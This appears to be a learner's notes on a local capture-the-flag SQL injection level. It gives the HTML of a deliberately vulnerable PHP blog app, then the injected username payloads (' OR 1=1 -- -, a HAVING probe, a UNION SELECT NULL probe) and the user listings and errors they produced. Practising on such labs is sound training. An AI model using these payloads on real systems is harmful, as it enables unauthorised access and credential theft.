@@ -1,0 +1,422 @@
+Level 07 – The Classic Injection
+Vulnerability: SQL Injection
+● Test the “username” field for SQL injection.
+● Try inputs like “' OR 1=1 -- -” or similar.
+● The goal is to extract user passwords.
+● Use SQL commands to bypass authentication and gain access.
+● Look for a table or column containing “admin” user data.
+
+Here's the page when accessing www.http://localhost:8000/index.php
+
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Home</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Home</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+
+<p>Welcome to Bloggo, a web-based system to create and share your blog!</p>
+
+<p>With Bloggo, users can finally have a space to let the world know 
+about their interests, their personal lives, and the fascinating 
+events that might be of interest to friends, family, and the rest 
+of the world.</p>
+
+<p>Start blogging right now! Join the million of bloggers that are
+shaping the public opinion this very moment!</p>
+
+<p>...and if you are lucky, you might find the secret password of the admin user!</p>
+
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+Here's the login page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Login</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Login</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+
+<p>Fill in the form below to log into the system.</p>
+<p>After you log in, you will be able to see blog entries and to
+create new ones!</p>
+<form method="post" action="./process_login.php">
+<table>
+<tr>
+<td class="form-label">Username</td>
+<td><input type="text" name="username" /></td>
+</tr>
+<tr>
+<td class="form-label">Password</td>
+<td><input type="password" name="password" /></td>
+</tr>
+</table>
+<p><input type="submit" value="Login" /></p>
+</form>
+<?
+myfooter()
+?>
+
+Here is the new user page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Create User</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Create User</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+  <p>New to bloggo? No problem!</p>
+  <p>Create a new account by filling the form below!</p>
+  <p>After creating a new account, please use the login page to 
+  log into the system.</p>
+
+<form method="post" action="./process_createuser.php">
+<table>
+<tr>
+<td class="form-label">First Name</td><td><input type="text" name="firstname" /></td>
+</tr>
+<tr>
+<td class="form-label">Last Name</td><td><input type="text" name="lastname" /></td>
+</tr>
+<tr>
+<td class="form-label">Email</td><td><input type="text" name="email" /></td>
+</tr>
+<tr>
+<td class="form-label">Username</td><td><input type="text" name="username" /></td>
+</tr>
+<tr>
+<td class="form-label">Password</td><td><input type="password" name="password" /></td>
+</tr>
+</table>
+<p><input type="submit" value="Create User" /></p>
+  </form>
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+Here is the new blog page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Create User</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Create User</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+  <p>New to bloggo? No problem!</p>
+  <p>Create a new account by filling the form below!</p>
+  <p>After creating a new account, please use the login page to 
+  log into the system.</p>
+
+<form method="post" action="./process_createuser.php">
+<table>
+<tr>
+<td class="form-label">First Name</td><td><input type="text" name="firstname" /></td>
+</tr>
+<tr>
+<td class="form-label">Last Name</td><td><input type="text" name="lastname" /></td>
+</tr>
+<tr>
+<td class="form-label">Email</td><td><input type="text" name="email" /></td>
+</tr>
+<tr>
+<td class="form-label">Username</td><td><input type="text" name="username" /></td>
+</tr>
+<tr>
+<td class="form-label">Password</td><td><input type="password" name="password" /></td>
+</tr>
+</table>
+<p><input type="submit" value="Create User" /></p>
+  </form>
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+Here us the blog entry page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Create User</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Create User</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+  <p>New to bloggo? No problem!</p>
+  <p>Create a new account by filling the form below!</p>
+  <p>After creating a new account, please use the login page to 
+  log into the system.</p>
+
+<form method="post" action="./process_createuser.php">
+<table>
+<tr>
+<td class="form-label">First Name</td><td><input type="text" name="firstname" /></td>
+</tr>
+<tr>
+<td class="form-label">Last Name</td><td><input type="text" name="lastname" /></td>
+</tr>
+<tr>
+<td class="form-label">Email</td><td><input type="text" name="email" /></td>
+</tr>
+<tr>
+<td class="form-label">Username</td><td><input type="text" name="username" /></td>
+</tr>
+<tr>
+<td class="form-label">Password</td><td><input type="password" name="password" /></td>
+</tr>
+</table>
+<p><input type="submit" value="Create User" /></p>
+  </form>
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+
+Here is the view page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::View Blogs</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::View Blogs</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+
+<p>Choose the blog you want to read for the list below.</p>
+<p>If you don't find the topic you are interested in, you can always
+create a new one, by going to the "New blog" page...</p>
+
+<ul>
+<li><a href="./process_view.php?blog=My Trip To China">My Trip To China</li>
+<li><a href="./process_view.php?blog=Surfin' in SoCal">Surfin' in SoCal</li>
+</ul>
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+
+Here is the search page:
+<html>
+  <head>
+    <link href="/bloggo.css" rel="stylesheet" type="text/css" />
+    <title>bloggo::Search Blog Entries</title>
+  </head>
+  <body>
+    <div id="page">
+      <div id="header">
+        <h1>bloggo::Search Blog Entries</h1>
+      </div>
+      <div id="navigation">
+        <ul>          <li id="home"><a href="index.php">Home</a></li>
+          <li id="login"><a href="login.php">Login</a></li>
+          <li id="newuser"><a href="createuser.php">New user</a></li>
+          <li id="newblog"><a href="createblog.php">New blog</a></li>
+          <li id="newentry"><a href="blogentry.php">New entry</a></li>
+          <li id="view"><a href="view.php">View blogs</a></li>
+          <li id="search"><a href="search.php">Search blogs</a></li>
+          <li id="logout"><a href="logout.php">Logout</a></li>
+        </ul>
+      </div>
+      <div id="body">
+<p>Search the existing blogs for entries that contain a specific keyword.</p>
+<form method="post" action="./process_search.php"><table>
+<tr>
+<td class="form-label">Keyword</td>
+<td><input type="text" name="keyword" /></td>
+</tr>
+</table>
+<p><input type="submit" value="Search" /></p>
+  </form>
+      </div>
+      <div id="footer">
+        <hr />
+        [<a href="index.php">Home</a>]<br />
+      </div>
+    </div>
+  </body>
+</html>
+
+
+In createuser.php, When I inputted the following:
+First Name: x
+Last Name: y
+Email: test@test.com
+Username: 'OR 1=1 -- -
+Password: z
+
+I got the following:
+We found users already registerd with this name
+
+Username: admin
+
+First: Wang
+
+Last: Fish
+
+Username: amadeus
+
+First: Amadeus
+
+Last: Mozart
+
+Username: david
+
+First: David
+
+Last: Chapelle
+
+Username: jack
+
+First: Jack
+
+Last: Ripper
+
+Username: jdee
+
+First: Jane
+
+Last: Dee
+
+Username: jdoe
+
+First: John
+
+Last: Doe
+
+An error occurred:
+
+A user with the specified name already exists.
+
+
+And when I instaed inject username with: ' HAVING 1=1 -- -
+It results with: "Duplicate entry ' HAVING 1-1 -- -' FOR KEY 'users.PRIMARY'
+
+
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- -
+Resulted in:
+We found users already registerd with this name
+
+Username:
+
+First:
+
+Last:
+
+An error occurred:
+
+A user with the specified name already exists.
